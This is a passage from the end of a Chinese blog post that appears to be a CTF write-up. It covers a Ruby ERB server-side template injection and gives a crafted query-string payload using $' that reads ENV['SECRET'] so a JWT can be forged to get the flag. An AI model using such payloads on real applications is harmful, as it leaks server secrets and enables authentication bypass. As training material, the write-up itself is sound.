<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;</span><br></pre></td></tr></table></figure>
<p>所以然后再用匹配后的值再进行匹配，所以SECRET参数的值最好为空，所以可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;%=$&#x27;%&gt;&amp;do=&lt;%=$&#x27;%&gt;%20is%20working&amp;$SECRET=</span><br></pre></td></tr></table></figure>
<p>来读取ENV[“SECRET”]的值，然后用来伪造jwt，即可获得flag</p>
<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86867]">https://www.anquanke.com/post/id/86867]</a></p>
<pre><code>[https://www.wangan.com/docs/255]

[https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html]

[https://www.jianshu.com/p/4f316191f595]
</code></pre>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2021 John Doe
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>